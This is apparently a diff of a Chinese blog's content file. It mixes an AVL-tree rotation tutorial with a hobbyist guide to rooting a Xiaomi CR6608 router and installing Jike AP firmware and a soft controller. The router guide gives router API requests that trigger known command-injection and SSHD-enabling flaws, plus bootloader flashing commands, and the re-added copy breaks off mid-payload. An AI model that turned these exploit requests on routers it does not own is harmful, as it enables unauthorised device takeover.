-<p>稍加等待，成功会返回一个code为0的json值<code>&#123;&quot;msg&quot;:&quot;connect succces!&quot;,&quot;code&quot;:0&#125;</code>。题外话，貌似开发人员在这里有拼写错误，我的路由器的确返回的是“succces”。</p>
-<blockquote>
-<p>踩坑：</p>
-<p>坑太多了，这里成功需要完全保证169.254.31.1的设备或者这个子网内不小心连上的其它设备都关闭DHCP，以确保CR6608在没有被分配IP的情况下将自己IP设置为169.254.31.2——所以为避免冲突整个子网也不能有IP为169.254.31.2的占用。我尝试的其他方案大多数都在这一步报了1619的错，唯一有一次在第三方旧路由方案中，我尝试各种接法中的一种，成功返回了code0，但是我已经忘记了它是怎么接的了，而且跟连上电脑A热点的DHCP是否是真的关掉了有非常大的关系。像上文提到的，CR6608并不是连不上热点，而是连上了热点不久又自己断掉才返回的1619报错。</p>
-</blockquote>
-<h6 id="1-2-7：在电脑B浏览器访问api：-api-xqsystem-oneclick-get-remote-token使路由器触发小米换机的漏洞，以此来开启SSHD"><a href="#1-2-7：在电脑B浏览器访问api：-api-xqsystem-oneclick-get-remote-token使路由器触发小米换机的漏洞，以此来开启SSHD" class="headerlink" title="1.2.7：在电脑B浏览器访问api：/api/xqsystem/oneclick_get_remote_token使路由器触发小米换机的漏洞，以此来开启SSHD"></a>1.2.7：在电脑B浏览器访问api：<code>/api/xqsystem/oneclick_get_remote_token</code>使路由器触发小米换机的漏洞，以此来开启SSHD</h6><p>在电脑B开启一个新的浏览器标签页或窗口，访问以下替换掉“路由器IP”、“stok值”的链接：（链接中的username以及其他参数的值都不要改，它就是xxx）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://路由器IP/cgi-bin/luci/;stok=stok值/api/xqsystem/oneclick_get_remote_token?username=xxx&amp;password=xxx&amp;nonce=xxx</span><br></pre></td></tr></table></figure>
-
-<p>稍加等待，成功一样会返回一个code为0的json值<code>&#123;&quot;token&quot;:&quot;..........&quot;,&quot;code&quot;:0&#125;</code>。至此，路由器的sshd已经成功开启，不要断掉连接也不要重启路由器，因为sshd没有固化。</p>
-<h2 id="2：刷PB-BOOT"><a href="#2：刷PB-BOOT" class="headerlink" title="2：刷PB-BOOT"></a>2：刷PB-BOOT</h2><h6 id="2-1：在电脑B上使用scp或者winscp等工具传PB-BOOT的img文件进路由器，在电脑B的终端上使用SSH登录路由器，刷入PB-BOOT"><a href="#2-1：在电脑B上使用scp或者winscp等工具传PB-BOOT的img文件进路由器，在电脑B的终端上使用SSH登录路由器，刷入PB-BOOT" class="headerlink" title="2.1：在电脑B上使用scp或者winscp等工具传PB-BOOT的img文件进路由器，在电脑B的终端上使用SSH登录路由器，刷入PB-BOOT"></a>2.1：在电脑B上使用scp或者winscp等工具传PB-BOOT的img文件进路由器，在电脑B的终端上使用SSH登录路由器，刷入PB-BOOT</h6><p>在电脑B上打开winscp，协议选择scp，IP地址填写路由器的地址即192.168.10.1，用户名是root，密码是机器背部贴纸的密码也就是管理页面的管理员密码。</p>
-<p>winscp进入路由器后，将提前准备好的PB-BOOT的img文件传送进路由器内，一般选择<code>/tmp</code>目录。</p>
-<p>接着，在终端上使用ssh进入路由器：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh -oHostKeyAlgorithms=+ssh-rsa root@192.168.10.1</span><br></pre></td></tr></table></figure>
-
-<p>成功进去之后，刷PB-BOOT：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mtd write /tmp/pb-boot.img Bootloader</span><br></pre></td></tr></table></figure>
-
-<p>运行完之后重启：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure>
-
-<p>至此，PB-BOOT刷完，重启机器稍微等待一会，拔掉路由器的电源，用取卡针或者牙签顶住路由器的reset按钮不松开，再接上路由器的电源，等待十几秒后松开reset按钮，此时路由器开机进入PB-BOOT。把电脑B的网卡改成192.168.1.0/24网段的，例如192.168.1.34，子网掩码改为255.255.255.0，就可以在电脑B上通过浏览器里访问192.168.1.1进入PB-BOOT。</p>
-<blockquote>
-<p>踩坑：</p>
-<p>winscp中协议不选scp会被目标拒绝。</p>
-<p>其他帖子提到CR6606在刷机之后root密码会变成与MAC/SN相关的密码需要计算才能得到。</p>
-<p>ssh不加rsa的参数去连接路由器如果报<code>no matching host key type found.Their offer:ssh-rsa</code>的错，需要加上<code>-oHostKeyAlgorithms=+ssh-rsa</code>参数，变成<code>ssh -oHostKeyAlgorithms=+ssh-rsa root@192.168.10.1</code></p>
-</blockquote>
-<h2 id="3：刷BREED改MAC（可选）"><a href="#3：刷BREED改MAC（可选）" class="headerlink" title="3：刷BREED改MAC（可选）"></a>3：刷BREED改MAC（可选）</h2><h6 id="3-1：刷集客固件之后每次重启MAC都会改变，如果最终目的是刷集客固件的话，需要事先刷BREED去固定MAC再刷会PB-BOOT。如果是刷OpenWrt或者其他固件，此步跳过。"><a href="#3-1：刷集客固件之后每次重启MAC都会改变，如果最终目的是刷集客固件的话，需要事先刷BREED去固定MAC再刷会PB-BOOT。如果是刷OpenWrt或者其他固件，此步跳过。" class="headerlink" title="3.1：刷集客固件之后每次重启MAC都会改变，如果最终目的是刷集客固件的话，需要事先刷BREED去固定MAC再刷会PB-BOOT。如果是刷OpenWrt或者其他固件，此步跳过。"></a>3.1：刷集客固件之后每次重启MAC都会改变，如果最终目的是刷集客固件的话，需要事先刷BREED去固定MAC再刷会PB-BOOT。如果是刷OpenWrt或者其他固件，此步跳过。</h6><p>紧接上文第2节，在PB-BOOT的页面上点击选择文件，选择电脑B上实现准备好的BREED的bin文件，点击恢复固件，耐心等待它刷完，点击“进入路由器首页”可以直接进BREED，BREED的IP也是192.168.1.1。点击MAC地址修改，在“LAN MAC”那一行填上机器背部贴纸上的MAC地址，点击“修改”。点击固件更新，勾选“Bootloader”，选择PB-BOOT固件，勾选“自动重启”，点击“上传”，点击“更新”，耐心等待它刷回PB-BOOT。提示成功刷完后，浏览器重新访问192.168.1.1就可以回到PB-BOOT了。</p>
-<blockquote>
-<p>踩坑：</p>
-<p>直接用BREED刷集客AP固件，在一些版本上会出现路由器指示灯不亮的问题，这对于CR6608影响非常大，因为它后面的接口也没有指示灯，如果正面的指示灯不亮的话，根本无法判断它是否正常开机。</p>
-</blockquote>
-<h2 id="4：刷集客AP固件"><a href="#4：刷集客AP固件" class="headerlink" title="4：刷集客AP固件"></a>4：刷集客AP固件</h2><h6 id="4-1：在PB-BOOT上选择8-0版本的集客固件刷入"><a href="#4-1：在PB-BOOT上选择8-0版本的集客固件刷入" class="headerlink" title="4.1：在PB-BOOT上选择8.0版本的集客固件刷入"></a>4.1：在PB-BOOT上选择8.0版本的集客固件刷入</h6><p>在PB-BOOT上选择电脑B上提前准备好的集客固件，固件的型号是AP246ND，版本是8.0，刷入。至此，路由器刷集客AP固件完成。</p>
-<h6 id="4-2：进入集客AP管理页面"><a href="#4-2：进入集客AP管理页面" class="headerlink" title="4.2：进入集客AP管理页面"></a>4.2：进入集客AP管理页面</h6><p>刷完后，集客AP的默认IP地址为6.6.6.6，像上文一样再次修改电脑B网卡的IP地址为6.6.6.6/24网段的IP例如6.6.6.34，就可以进入集客AP的管理页面。</p>
-<blockquote>
-<p>踩坑：</p>
-<p>6.1版本的AP246ND固件的管理页面，用Edge浏览器无法登录，在输入密码后进入页面会闪一下便立刻退出，换Chrome没有发现此问题，疑似跟浏览器的插件有冲突。另外7.4版本的AP246ND固件在Edge上打开管理页面一切正常。</p>
-<p>从<a href="https://www.right.com.cn/forum/thread-8089957-1-1.html">小米CR660X（6606/6608/6609) 折腾过程以及刷集客AP测试发现的几个问题-小米无线路由器及小米网络设备-恩山无线论坛</a>看来，有着先刷6.1再更新7.4的操作，原因为：低版本存在射频无信号的BUG，高版本存在开机几分钟便无限重启的BUG，先刷6.1再升7.4可以同时避免这两个BUG。</p>
-<p>7.4版本的5G信号启动得非常慢，起初我误以为此版本在路由器上没有5G射频，事实上开机好几分钟之后才能在列表看到5G的SSID。重新刷了7.2版本，此问题同样存在。</p>
-<p>目前尝试过的版本：6.4、7.2、7.4、8.0都会在重启后丢失所有配置，所以从实际情况考虑是需要部署一个AC用于下发配置的。</p>
-<p>最终选择的8.0集客AP固件是没有free版本的，所以8.0的管理页面会显示未注册——即使刚刷完显示已注册但用一会就会变回未注册。就目前看来，未注册暂时没有对我造成使用上的困扰。</p>
-</blockquote>
-<h2 id="5：部署集客AC"><a href="#5：部署集客AC" class="headerlink" title="5：部署集客AC"></a>5：部署集客AC</h2><p>集客官方直接提供了AC控制器在各平台的二进制文件：<a href="http://file.cnrouter.com/index.php/Index/gac.html">文件管理</a>，加上我的主路由环境多年来一直都是ESXi打底上面跑OpenWrt的组合，使得安装软AC的过程畅通无阻。如果主路由没有虚拟化的话，软AC需要考虑其他方案，比如在OpenWrt上跑Docker部署软AC的镜像，或者不考虑软AC，改之为使用一台合适的路由器刷集客对应版本的AC固件。</p>
-<h6 id="5-1：ESXi创建虚拟机"><a href="#5-1：ESXi创建虚拟机" class="headerlink" title="5.1：ESXi创建虚拟机"></a>5.1：ESXi创建虚拟机</h6><p>集客官方在<a href="http://file.cnrouter.com/index.php/Index/gac.html">文件管理</a>提供了86、amd64、arm、mips各个平台的文件，选择最熟悉的系统即可。这里安装的是我比较熟悉的Debian，从Debian官网提供的镜像站下载Debian的iso文件<a href="https://mirrors.163.com/debian-cd/12.10.0/amd64/iso-dvd/debian-12.10.0-amd64-DVD-1.iso">debian-12.1.0-amd64-DVD-1.iso</a>。</p>
-<p>在ESXi上创建一台虚拟机，在设置上，网络适配器：选择的端口组为主路由所在的端口组，或不同端口组但两端口组处于同一个虚拟交换机内，这里显而易见是为了让Debian与主路由所处的网络连通。CD/DVD硬盘驱动器：选择Debian的iso镜像。</p>
-<p>启动Debian虚拟机开始安装系统，安装过程中的不要选择任何多余的软件，只需要选择安装SSH就可以了。</p>
-<h6 id="5-2：虚拟机的基本网络配置"><a href="#5-2：虚拟机的基本网络配置" class="headerlink" title="5.2：虚拟机的基本网络配置"></a>5.2：虚拟机的基本网络配置</h6><p>根据集客官方的说明文档：<a href="http://file.cnrouter.com/upload/gac/%E5%90%AB%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E7%89%88%E6%9C%AC%EF%BC%88%E4%B8%BB%E8%A6%81%E7%94%A8%E4%BA%8E%E7%8B%AC%E7%AB%8B%E4%BD%BF%E7%94%A8%EF%BC%89/%E8%BF%90%E8%A1%8C%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E.txt">file.cnrouter.com/upload/gac/含登录页面版本（主要用于独立使用）/运行参数说明.txt</a>，需要让AP能访问到6.7.8.9:60650，可选方案一是把Debian的IP静态为6.7.8.9，二是从OpenWrt主路由做一个转发从Debian的IP:端口转发到6.7.8.9:60650。为了考虑方便迁移，减少依赖性，此处选择的前者，直接把Debian静态为6.7.8.9。</p>
-<p>修改<code> /etc/network/interfaces</code>，把Debian当前的网卡ens33设为静态，网关指向OpenWrt主路由。</p>
-<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ipv4 static                                                                     auto ens33                                                                       iface ens33 inet static                                                           address 6.7.8.9                                                                   netmask 255.255.255.0                                                             gateway 192.168.2.1</span></span><br></pre></td></tr></table></figure>
-
-<p>重启网卡</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart networking</span><br></pre></td></tr></table></figure>
-
-<h6 id="5-3-部署集客软AC"><a href="#5-3-部署集客软AC" class="headerlink" title="5.3: 部署集客软AC"></a>5.3: 部署集客软AC</h6><p>下载集客官方提供的文件<a href="http://file.cnrouter.com/upload/gac/%E5%90%AB%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E7%89%88%E6%9C%AC%EF%BC%88%E4%B8%BB%E8%A6%81%E7%94%A8%E4%BA%8E%E7%8B%AC%E7%AB%8B%E4%BD%BF%E7%94%A8%EF%BC%89/ac_linux_amd64_V2.2_202503181710">ac_linux_amd64_V2.2_202503181710</a>到Debian</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line">mkdir jike</span><br><span class="line"><span class="built_in">cd</span> ./jike</span><br><span class="line">wget http://file.cnrouter.com/upload/gac/%E5%90%AB%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E7%89%88%E6%9C%AC%EF%BC%88%E4%B8%BB%E8%A6%81%E7%94%A8%E4%BA%8E%E7%8B%AC%E7%AB%8B%E4%BD%BF%E7%94%A8%EF%BC%89/ac_linux_amd64_V2.2_202503181710</span><br><span class="line">chmod +x ac_linux_amd64_V2.2_202503181710</span><br></pre></td></tr></table></figure>
-
-<p>到这里其实就可以直接运行集客AC了，但还可以再做一些工作完善一下。</p>
-<h6 id="5-4-设置集客AC开机启动"><a href="#5-4-设置集客AC开机启动" class="headerlink" title="5.4 设置集客AC开机启动"></a>5.4 设置集客AC开机启动</h6><p>首先我们设置Debian这个虚拟机在宿主机ESXi启动时自动启动，在ESXi虚拟机列表右键Debian弹出菜单点击自动启动，启用它。</p>
-<p>在Debian刚刚放集客AC的目录下面再新建一个脚本固定一下ac启动的参数，根据官方的说明<a href="http://file.cnrouter.com/upload/gac/%E5%90%AB%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E7%89%88%E6%9C%AC%EF%BC%88%E4%B8%BB%E8%A6%81%E7%94%A8%E4%BA%8E%E7%8B%AC%E7%AB%8B%E4%BD%BF%E7%94%A8%EF%BC%89/%E8%BF%90%E8%A1%8C%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E.txt">file.cnrouter.com/upload/gac/含登录页面版本（主要用于独立使用）/运行参数说明.txt</a>，可选参数非常少并且简单易懂，其间也给出了启动示例，只需要关心<code>-p</code>和<code>-mp</code>自定义一下控制器端口和管理页面端口，<code>-f</code>和<code>-dbpath</code> 自定义一下上传文件目录和数据库目录即可</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/jike</span><br><span class="line">touch ac_run.sh</span><br><span class="line">chmod +x ac_run.sh</span><br></pre></td></tr></table></figure>
-
-<p>在<code>ac_run.sh</code>写上运行ac_linux_amd64_V2.2_202503181710的命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">nohup ./ac_linux_amd64_V2.2_202503181710 -p 60650 -mp 80 -f ./upload/ -dbpath ./ -token 1 -lang zh -https 0 -isonlyoneprot 0 &gt;ac_linux_amd64.log&amp;</span><br></pre></td></tr></table></figure>
-
-<p>接着加入开机启动脚本</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/init.d</span><br><span class="line">touch jike.sh</span><br><span class="line">chmod +x jike.sh</span><br></pre></td></tr></table></figure>
-
-<p>在<code>jike.sh</code>写上执行ac_run.sh的命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### BEGIN INIT INFO</span></span><br><span class="line"><span class="comment"># Provides: jike_ac</span></span><br><span class="line"><span class="comment"># Required-Start: $network $remote_fs $local_fs</span></span><br><span class="line"><span class="comment"># Required-Stop: $network $remote_fs $local_fs</span></span><br><span class="line"><span class="comment"># Default-Start: 2 3 4 5</span></span><br><span class="line"><span class="comment"># Default-Stop: 0 1 6</span></span><br><span class="line"><span class="comment"># Short-Description: run jike ac</span></span><br><span class="line"><span class="comment"># Description: run jike ac</span></span><br><span class="line"><span class="comment">### END INIT INFO</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /etc/jike</span><br><span class="line">./ac_run.sh</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure>
-
-<p>加入开机启动，重启一下Debian检查下开机启动是否成功</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-rc.d jike.sh defaults</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
-
-<h6 id="5-5：设置AC控制器，下发AP配置"><a href="#5-5：设置AC控制器，下发AP配置" class="headerlink" title="5.5：设置AC控制器，下发AP配置"></a>5.5：设置AC控制器，下发AP配置</h6><p>把电脑改为与6.7.8.9同一网段，访问6.7.8.9进入AC控制器的管理页面。管理页面上说明写着“无线AP可以跨VLAN，子网，三层交换机，路由器和防火墙找到本AC”，“在未隔离广播的情况下，子网6.7.8.9/255.255.255.0内的AP可以通过广播的方式自动发现本AC”，“也可以通过在核心交换机上添加一条到6.7.8.9/32,下一跳为6.7.8.9的静态路由来让AP发现本AC”。</p>
-<p>按理说，把所有刷好AP固件的路由器LAN口接入到局域网中，网络配置无误的情况下在AC管理页面的无线AP列表会显示出所有AP。</p>
-<blockquote>
-<p>踩坑：</p>
-<p>我把路由器接入到局域网中之后，在子网内AC无法发现AP，折腾了一番只能选择去OpenWrt主路由添加一条静态路由。接口选局域网的接口，路由类型选单播，目标填6.7.8.9/32，网关填0.0.0.0。添加这条静态路由之后，不仅6.6.6.6的AP路由器能连通到AC的6.7.8.9，整个局域网都能连通到6.7.8.9了。</p>
-</blockquote>
-<p>在AC控制器管理页面新增模板，设置好WIFI的各个参数，再把模板下发给所有AP路由器即可，接着选择所有AP路由器修改密码，对每台AP单独命名。至此，集客AC部署设置完成。</p>
+    <title>AVL树的旋转</title>
+    <url>/138867439/</url>
+    <content><![CDATA[<h2 id="特定例子"><a href="#特定例子" class="headerlink" title="特定例子"></a>特定例子</h2><p>现在我们开始解决<a href="https://liangziye.online/2536969901/">AVL树</a>中提到最小不平衡子树，使AVL树重新恢复平衡状态。</p>
+<p>下图先举例一个最简单的平衡的AVL树在经过插入操作后变得不平衡的例子</p>
+<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC1.png"></p>
+<p>如图所示插入结点5后，父结点7的平衡因子变为1,再往上的父节点10变为2，这个结点10就是我们要找的最小不平衡子树的根结点。我们把最小不平衡子树拿出来单独讨论。</p>
+<p>这是最简单的情况，最小不平衡子树的根结点为结点10，新插入结点5是根结点10的左子结点的左子结点，这种情况我们成为<strong>LL型</strong>（左左型）。在LL型中，根结点10比它的左子结点大，它的左子结点也比新插入的结点大，我们可以把这三个结点的位置转一转，把结点10转到结点7的右下方，也就是从结点7的父节点变成了结点7的右子结点，而结点7自己成了根结点</p>
+<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC2.png"></p>
+<p>现在以结点7为根结点的子树平衡了，整个树也就重新达到AVL的平衡条件了。我们旋转的对象是根结点10，根据它的旋转方向我们称这种旋转为<strong>右旋</strong>。所以LL型我们只需要一次右旋就能重新回归平衡。因为结点10和结点7之间的大小关系，所以结点10既能做结点7的父结点，也能做结点7的右子结点，右旋操作就是将操作结点从父结点变为右子结点。</p>
+<p>这个LL型过于简单，再举个LL型的最小子树例子，下面这个例子的子树高度比上面那个例子要高，但同样只需要一次右旋就能回到平衡状态。</p>
+<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC3.png"></p>
+<p>完全对称的，我们也有<strong>RR型</strong>（右右型），所以对称地我们需要一次<strong>左旋</strong>来让RR型回归平衡，我现在把LL型的例子变成RR型，再看看示意图，完全是对称的操作。右旋操作就是将操作结点从父结点变为左子结点。</p>
+<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC4.png"></p>
+<h2 id="LL型"><a href="#LL型" class="headerlink" title="LL型"></a>LL型</h2><p>例子举完了，现在该分析一下所有可能存在的情况了。如下图，设想现在有一个子树的根结点t，子树处于平衡状态，它的左子树我们先记做ltree，右子树我们记做rtree。左子树和右子树中的结点数未知，但是它们的高度差因为平衡所以一定不大于1。现在我们插入一个新的结点n，假定我们插入新的结点之后，树将不再平衡，并且这个以结点t为根的子树是整个树的最小不平衡子树。那只有两种插入情况，一种是插入在左子树上，左子树比右子树高2，一种是插在右子树上，右子树比左子树高2，我们把比较矮的一边子树的高度记做h，则另一边比较高的子树的高度为h+2。当然h必须h≥0。可以想象到这两种情况是对称的，那他们解决平衡的操作也是对称的。</p>
+<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC5.png"></p>
+<p>我们现在拿情况1出来分析，把ltree又分为它的根结点tl和tl的左子树lltree和右子树lrtree，同样有两种情况，结点n要么是接在lltree上要么是接在lrtree上，根据上面的讨论，高度如下图所示，同时我也标注好了平衡因子。</p>
+<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC6.png"></p>
+<p>注意！以上的讨论都是建立在结点t构成的子树为最小不平衡子树下。因为这个子树为最小不平衡子树，所以必然的，情况1-1中lltree和lrtree还有rtree三个子树的高度都相等都是h，情况1-2中rltree和rrtree还有ltree三个子树的高度也相等也都是h。h要满足h≥0。反过来说lltree和lrtree还有rtree（或是rltree和rrtree还有ltree）它们的高度不可能不相等，如果不相等那结点t构成的子树就不是最小不平衡子树，记住我们所讨论的情况都是建立在结点t是最小不平衡子树的根结点上的。</p>
+<p>对于情况1-1我们可以继续分类讨论出情况1-1-1和1-1-2……但这样套娃已经完全没有必要了，因为我们现在就能针对情况1-1做出普适性的回归平衡方法。</p>
+<p>现在我们针对情况1-1来看，发现上文中右旋的两个例子就是情况1-1，情况1-1即是LL型。当lltree和lrtree还有rtree的高度为0时，就是上文右旋的第一个例子，而这三个子树高度为1时，就是上文右旋中第二个例子。可以继续推导的是，lltree和lrtree还有rtree的高度h只要满足h≥0，这种最小不平衡子树都是LL型，能都通过对根结点t一次右旋重新回归平衡，如下图。</p>
+<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC7.png"></p>
+<h2 id="LR型"><a href="#LR型" class="headerlink" title="LR型"></a>LR型</h2><p>接下来讨论情况1-2，我们发现这不再是LL型了，我们无法通过一次右旋来解决问题，如下图：</p>
+<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC8.png"></p>
+<p>我们需要继续分析讨论情况1-2，分类讨论结点n插入的更准确的位置。我们把lrtree这个子树细分成结点tlr和其左右子树lrltree和lrrtree。我们对情况1-2分别得到以下两种情况1-2-a和1-2-b。1-2-a是结点n插在lrltree上，1-2-b是结点n插在lrrtree上。</p>
+<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC9.png"></p>
+<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC10.png"></p>
+<p>经过分析我们发现，虽然我们不能通过一次右旋来回归平衡，但是我们发现如果对情况1-2-a和1-2-b中的结点tl进行一次左旋，我们将把情况1-2-a和1-2-b转变了LL型，如下图</p>
+<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC11.png"></p>
+<p>情况1-2-a和1-2-b进行了左旋之后，得到的LL型是有区别的，情况1-2-a左旋结果的结点tlr的平衡因子为2，最小不平衡子树变成了以结点tlr为根的最小不平衡子树，不是结点t。而情况1-2-b左旋结果的结点tlr的平衡因子为1，所以依然是以结点t为根结点的最小不平衡子树。对于情况1-2-a左旋结果，它的最小不平衡子树变了，虽然也是LL型，但是我们能对结点tlr做一次右旋让它回归平衡吗？答案是不能，这样又变回情况情况1-2-a了，左右旋本身就是互为反操作。那这样的话，我们依旧是把情况1-2-a左旋结果的最小不平衡子树当做没有变动，根结点依旧是结点t，所以对于情况1-2-a左旋结果和情况1-2-b左旋结果，这两个都是根为结点t的LL型，我们对结点t做一次右旋即可回归平衡。如下图。</p>
+<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC12.png"></p>
+<p>情况1-2细分的两种情况现在就已经解决了不平衡问题，方法都是先对结点tl做一次左旋，再对结点t做一次右旋，我们把情况1-2称作LR型。所以LR型的最小不平衡子树，我们先对根结点t的左子节点tl做左旋转换成LL型后，再对结点t做右旋，即可平衡。但LR型里面也是有区别的，虽然都是对结点一样的操作，可重新平衡之后结点t和结点tl的平衡因子是不一样的，在实现上要注意处理这个问题。</p>
+<h2 id="RR型和RL型"><a href="#RR型和RL型" class="headerlink" title="RR型和RL型"></a>RR型和RL型</h2><p>至此，其实我们已经解决掉AVL树的一半旋转方法了。LL型对根结点t做一次右旋，LR型对根结点t的左子节点tl做一次左旋再对结点t做一次右旋。对称地，我们可以得知，把LL型和LR型镜像翻转过来我们得到RR型，和RL型，重新平衡的操作也是对称的，对于RR型应当对根结点t做一次左旋，对于RL型应当对根结点t的右子结点tr做一次右旋，再对结点t做一次左旋。于是我们对于所有的不平衡情况都给出了平衡的旋转方法。下面示意图表示一下RR和RL的过程，就不从头分析一遍了。</p>
+<p>RR型：</p>
+<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC13.png"></p>
+<p>RL型</p>
+<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC14.png"></p>
+<p>RL型对结点tr右旋转换成RR型：</p>
+<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC15.png"></p>
+<p>最后再对结点t左旋：</p>
+<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC16.png"></p>
 ]]></content>
+      <categories>
+        <category>数据结构</category>
+      </categories>
+      <tags>
+        <tag>tree</tag>
+        <tag>AVLTree</tag>
+      </tags>
   </entry>
   <entry>
     <title>HashMap</title>
@@ -513,6 +350,169 @@
       <tags>
         <tag>leetcode</tag>
       </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/1/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文记录了从无到有将CR6608从官方固件刷成集客AP，并在局域网中安装集客软AC的完整过程，仅仅是本人自身实践的回顾和对刷机原理的总结，因环境存在差异，刷机有风险，如需使用请谨慎参照本文，不可照搬。另外，CR660X的刷机到现在已经非常普遍非常简单了，所有资料所有知识都来自于各个博客和论坛相关帖子，文中的操作全都可以通过搜索引擎搜索得到。</p>
+<p>CR6606/CR6608/CR6609/TR608各型号的区别不在下文实践范围内，其中的差异需要搜索其他资料来确定。下文所有操作都基于CR6608、所有提到的“路由器”都特指CR6608。</p>
+<h2 id="当前环境："><a href="#当前环境：" class="headerlink" title="当前环境："></a>当前环境：</h2><ul>
+<li>CR6608为移动的1.0.23版本，双频WIFI开启但不合并，SSID和密码默认与机器背部贴纸上一致，工作模式为“普通路由工作模式”，DHCP开启，局域网IP为默认即192.168.10.1</li>
+</ul>
+<h2 id="必要环境"><a href="#必要环境" class="headerlink" title="必要环境"></a>必要环境</h2><ul>
+<li>CR6608为运营商官方固件，其版本必须足够低，若是高版本建议先刷为低版本。</li>
+</ul>
+<h2 id="1：启用路由器的SSHD"><a href="#1：启用路由器的SSHD" class="headerlink" title="1：启用路由器的SSHD"></a>1：启用路由器的SSHD</h2><p>利用漏洞向路由器注入命令，启用路由器的sshd。</p>
+<p>下文中所有实践的方法都是需要登录路由器管理页面的，登录成功后保持管理页面不要关闭，在地址栏获得stok参数的值，有了它就可以请求路由器的api了。api通常为: <code>http://[浏览器ip]/cgi-bin/luci/;stok=[stok值]/api/xxxxxxx/xxxxxxxx</code>，下文中所有提到的api都简写为<code>/api/xxxxxxx/xxxxxxxx</code>。下文中提到的<a href="https://blog.thalium.re/posts/rooting-xiaomi-wifi-routers/">Rooting Xiaomi WiFi Routers</a>文章也讨论了不需要stok值即不需要登录管理页面的相关漏洞，但它不在本文实践范围之内。</p>
+<h4 id="1-1：利用smartcontroller漏洞"><a href="#1-1：利用smartcontroller漏洞" class="headerlink" title="1.1：利用smartcontroller漏洞"></a>1.1：利用smartcontroller漏洞</h4><p>利用这个漏洞的前提是路由器开启smartcontroller，如果没有开启就发起请求会得到Internal Server Error的响应，开启smartcontroller需要使用api：<code>/api/misystem/set_sys_time</code>来设定系统时间，这个api接受一个名为<code>time</code>的参数，把值设为<code>2023-2-19 23:4:47&amp;timezone=CST-8</code>即可开启smartcontroller。这个请求为GET请求。</p>
+<p><a href="https://blog.thalium.re/posts/rooting-xiaomi-wifi-routers/">Rooting Xiaomi WiFi Routers</a>文章中，有一个关于smartcontroller的注入漏洞，对于api：<code>/api/xqsmarthome/request_smartcontroller</code>，接受一个名为<code>payload</code>的参数，文章内已经为我们构造了这个参数的值：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;command&quot;</span>:<span class="string">&quot;scene_setting&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>:<span class="string">&quot;it3&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;action_list&quot;</span>:[</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">&quot;thirdParty&quot;</span>:<span class="string">&quot;xmrouter&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;delay&quot;</span>:<span class="number">17</span>,</span><br><span class="line">                <span class="attr">&quot;type&quot;</span>:<span class="string">&quot;wan_block&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;payload&quot;</span>:</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">&quot;command&quot;</span>:<span 